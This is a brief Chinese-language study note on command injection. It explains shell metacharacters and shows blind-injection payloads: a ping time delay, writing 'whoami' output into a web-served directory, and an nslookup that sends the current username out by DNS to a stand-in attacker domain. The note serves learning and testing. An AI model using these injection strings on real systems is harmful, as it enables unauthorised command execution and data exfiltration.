# Command Injection
## Shell metacharacters
* `&` : 背景執行。
* `|` : 將當前輸出，作為下一個指令的輸出。
* `&&` : 前一個指令成功，才會執行下一個。
* `||` : 前一個指令失敗，才會執行下一個。
* `;` : 終止符號 (用在依序執行指令)。
* `0x0a or \n` 換行。
* ``` `` or $() ``` : 行內執行指令。
## Blind command injection
### Time delays
* 使用 ping 指令來達到時間延遲。
```
& ping -c 10 127.0.0.1 &
```
### Redirecting output
* 將結果輸出。
```
& whoami > /var/www/static/whoami.txt &
```
### Out-of-band (OAST) techniques
* 使用 nslookup 進行 dns 查詢。
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```
* ``` `whoami` ``` 這邊會執行，因此會的到下面結果，拿到當前使用者名稱。
```
wwwuser.kgji2ohoyw.web-attacker.com
```
---
###### tags: `web security`